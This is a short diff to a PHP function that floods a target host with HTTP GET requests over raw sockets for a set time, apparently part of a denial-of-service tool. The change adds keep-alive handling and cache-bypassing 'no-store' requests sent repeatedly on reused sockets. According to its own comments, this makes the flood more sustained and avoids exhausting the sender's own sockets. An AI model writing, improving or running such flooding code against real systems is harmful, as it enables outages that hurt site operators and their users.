@@ -187,12 +187,19 @@
 
     function _http($ip, $host, $port, $time) {
         $start_time = microtime(true);
-        $data = "GET / HTTP/1.1\r\nHost:" . $host . "\r\nUser-Agent: Mozilla/5.0\r\nConnection: Keep-Alive\r\nKeep-Alive: timeout=5, max=1000\r\n\r\n";
+
+        // initial http request with keep-alive header set ---> socket will then accept multiple requests
+        $data = "GET / HTTP/1.1\r\nHost:" . $host . "\r\nUser-Agent: Mozilla/5.0\r\nConnection: Keep-Alive\r\n\r\n";
+        
         while ((microtime(true) - $start_time) < $time) {
             try {
                 $socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
                 socket_connect($socket, $ip, $port);
                 socket_write($socket, $data, strlen($data));
+
+                // new static http request
+                $data = "GET / HTTP/1.1\r\nHost:" . $host . "\r\nUser-Agent: Mozilla/5.0\r\nCache-Control: no-store\r\n\r\n";
+                
                 // reuse to prevent TIME_WAIT local-socket exhaustion
                 while ((microtime(true) - $start_time) < $time) {
                     socket_write($socket, $data, strlen($data));
